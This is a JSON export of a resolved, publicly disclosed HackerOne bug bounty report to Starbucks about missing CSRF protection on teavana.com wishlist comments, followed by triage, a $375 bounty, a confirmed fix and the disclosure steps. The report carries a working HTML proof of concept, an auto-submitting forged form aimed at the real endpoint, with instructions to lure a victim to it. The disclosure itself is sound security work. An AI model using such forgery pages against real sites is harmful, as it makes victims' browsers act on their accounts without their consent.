{"id":177639,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNzc2Mzk=","url":"https://hackerone.com/reports/177639","title":"CSRF exploit | Adding/Editing comment of wishlist items (teavana.com - Wishlist-Comments)","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2016-10-23T12:19:25.070Z","submitted_at":"2016-10-23T12:19:25.070Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"faisalahmed","url":"/faisalahmed","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/003/726/e66916f9112a11c1e97ec5ea0ad886121d14f38b_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1989,"url":"https://hackerone.com/starbucks","handle":"starbucks","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Starbucks","twitter_handle":"Starbucks","website":"http://www.starbucks.com","about":"Inspiring and nurturing the human spirit -- one person, one cup, one neighborhood at a time."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2017-02-13T22:47:44.932Z","bug_reporter_agreed_on_going_public_at":"2017-02-09T10:11:42.094Z","team_member_agreed_on_going_public_at":"2017-02-13T22:47:44.896Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hello Team,\nI noticed there is no CSRF protection in Adding/Editing comment of wishlist items.\n\nAREA: https://www.teavana.com/us/en/my-wishlist\n\nAttacker could take advantage of this issue and exploit victim remotely.\n\n####POC:\nMethod: **POST**\n\nPOST URL: https://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/Wishlist-Comments/C1495572478\n*here `C1495572478` is wishlist id number*\nPost Contents:\n```\nwishlistComment=comment\n```\n\nHTML POC to reproduce:\n```\n\u003chtml\u003e\n\u003chead\u003e\u003ctitle\u003eCSRF POC\u003c/title\u003e\u003c/head\u003e\n\u003cbody onLoad=\"document.forms[0].submit()\"\u003e\n\u003cform action=\"https://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/Wishlist-Comments/C1495572478\" method=\"POST\"\u003e\n\u003cinput type=\"text\" name=\"wishlistComment\" value=\"comment\"\u003e\u003cbr\u003e\n\u003cinput type=\"text\" name=\"save\" value=\"Save\"\u003e\u003cbr\u003e\n\u003c/form\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n```\n\n* Save this snippet as HTML.\n* Make your victim visit the snippet/link.\n* comment will be added/edited automatically.\n\nHope you'll fix this one.\n\nLooking forward!","bounty_amount":"375.0","formatted_bounty":"$375","weakness":{"id":45,"name":"Cross-Site Request Forgery (CSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-03-11T10:11:42.149Z","allow_singular_disclosure_after":-144733312.07067776,"singular_disclosure_allowed":true,"vote_count":7,"voters":["spam404","gamliel","eveeez","sumit7","spetr0x","imran_hadid","akashpatel50"],"severity":{"rating":"medium","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1267240,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","automated_response":false,"created_at":"2016-10-25T19:32:36.911Z","updated_at":"2016-10-25T19:32:36.911Z","additional_data":{"old_title":"CSRF exploit | Adding/Editing comment of wishlist items","new_title":"CSRF exploit | Adding/Editing comment of wishlist items (Wishlist-Comments)"},"actor":{"username":"sharpie","cleared":false,"url":"/sharpie","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/093/272/b7429121474103e01ac6fabf477ddb52ed91556d_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1267241,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","automated_response":false,"created_at":"2016-10-25T19:32:49.203Z","updated_at":"2016-10-25T19:32:49.203Z","additional_data":{"old_title":"CSRF exploit | Adding/Editing comment of wishlist items (Wishlist-Comments)","new_title":"CSRF exploit | Adding/Editing comment of wishlist items (teavana.com - Wishlist-Comments)"},"actor":{"username":"sharpie","cleared":false,"url":"/sharpie","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/093/272/b7429121474103e01ac6fabf477ddb52ed91556d_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1267243,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @faisalahmed \n\nWe are currently reviewing this submission and we'll notify you as soon as we have an update. Thanks! ","automated_response":false,"created_at":"2016-10-25T19:33:12.931Z","updated_at":"2016-10-25T19:33:12.931Z","actor":{"username":"sharpie","cleared":false,"url":"/sharpie","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/093/272/b7429121474103e01ac6fabf477ddb52ed91556d_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1267244,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2016-10-25T19:33:21.861Z","updated_at":"2016-10-25T19:33:21.861Z","additional_data":{"old_severity":null,"new_severity":"Medium","old_severity_id":null,"new_severity_id":4176},"actor":{"username":"sharpie","cleared":false,"url":"/sharpie","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/093/272/b7429121474103e01ac6fabf477ddb52ed91556d_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1272918,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2016-10-28T14:51:38.390Z","updated_at":"2016-10-28T14:51:38.390Z","actor":{"username":"siren","cleared":false,"url":"/siren","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/043/496/422aa228af5a54db16d191c4bed22c984a6429f2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1272920,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks @faisalahmed!\nWe'll be in touch when it's time to re-test this one.","automated_response":false,"created_at":"2016-10-28T14:53:25.380Z","updated_at":"2016-10-28T14:53:25.380Z","actor":{"url":"/starbucks","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Starbucks"}},"bounty_amount":"375.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"starbucks","collaborator":{"username":"faisalahmed","url":"/faisalahmed"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1272948,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the bounty :) ","automated_response":false,"created_at":"2016-10-28T15:02:40.704Z","updated_at":"2016-10-28T15:02:40.704Z","actor":{"username":"faisalahmed","cleared":true,"url":"/faisalahmed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/726/e66916f9112a11c1e97ec5ea0ad886121d14f38b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1471907,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hello @faisalahmed,\n\nThank you for your patience while we worked on this report. Please re-test and confirm that the issue has been resolved.","automated_response":false,"created_at":"2017-02-08T17:23:18.660Z","updated_at":"2017-02-08T17:23:18.660Z","actor":{"username":"coldbr3w","cleared":false,"url":"/coldbr3w","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/109/209/dd6ef3a28f555d97d4d9c90c41c908d9b11daf47_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"faisalahmed","url":"/faisalahmed"},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1474013,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Fix confirmed!\nThe issue no longer reproduces for me. I appreciate you resolving this one :)","automated_response":false,"created_at":"2017-02-09T10:07:31.959Z","updated_at":"2017-02-09T10:07:31.959Z","actor":{"username":"faisalahmed","cleared":true,"url":"/faisalahmed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/726/e66916f9112a11c1e97ec5ea0ad886121d14f38b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1474018,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"..","automated_response":false,"created_at":"2017-02-09T10:11:22.738Z","updated_at":"2017-02-09T10:11:39.525Z","actor":{"username":"faisalahmed","cleared":true,"url":"/faisalahmed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/726/e66916f9112a11c1e97ec5ea0ad886121d14f38b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1474022,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Would like to disclose this one, along with the other one ( #177508) in same area! ","automated_response":false,"created_at":"2017-02-09T10:11:42.116Z","updated_at":"2017-02-09T10:11:42.116Z","first_to_agree":true,"actor":{"username":"faisalahmed","cleared":true,"url":"/faisalahmed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/726/e66916f9112a11c1e97ec5ea0ad886121d14f38b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1483679,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2017-02-13T22:47:44.910Z","updated_at":"2017-02-13T22:47:44.910Z","actor":{"username":"siren","cleared":false,"url":"/siren","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/043/496/422aa228af5a54db16d191c4bed22c984a6429f2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1483680,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2017-02-13T22:47:44.945Z","updated_at":"2017-02-13T22:47:44.945Z","actor":{"username":"siren","cleared":false,"url":"/siren","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/043/496/422aa228af5a54db16d191c4bed22c984a6429f2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}